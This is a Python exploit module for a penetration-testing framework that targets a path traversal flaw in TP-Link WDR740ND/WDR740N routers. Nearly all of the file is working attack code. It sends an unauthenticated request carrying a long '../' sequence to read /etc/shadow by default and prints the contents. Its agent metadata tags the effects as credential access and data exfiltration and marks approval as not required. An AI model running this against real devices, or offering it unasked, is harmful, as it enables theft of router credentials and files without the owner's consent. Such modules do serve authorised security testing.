#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TP-Link WDR740ND & WDR740N Path Traversal"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'TP-Link WDR740ND & WDR740N Path Traversal',
        'description': 'Exploits TP-Link WDR740ND and WDR740N path traversal vulnerabilitythat allowsto read files from the filesystem.',
        'author': ['websec.ca', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['http://www.websec.mx/publicacion/advisories/tplink-wdr740-path-traversal'],
        'tags': ['iot', 'router', 'lfi', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    filename = OptString("/etc/shadow", "File to read from the filesystem")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            path = "/help/../../../../../../../../../../../../../../../..{}".format(self.filename)

            print_status("Sending payload request")
            response = self.http_request(
                method="GET",
                path=path
            )
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                pos = response.text.find("//--></SCRIPT>") + 15
                res = response.text[pos:]

                if len(res):
                    print_status("Reading file {}".format(self.filename))
                    print_info(res)
                else:
                    print_error("Could not read file {}".format(self.filename))

        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        path = "/help/../../../../../../../../../../../../../../../../etc/shadow"

        response = self.http_request(
            method="GET",
            path=path
        )
        if response is None:
            return False  # target is not vulnerable

        if ("/etc/shadow" in (response.text or '')):
            return True  # target is vulnerable

        return False  # target is not vulnerable
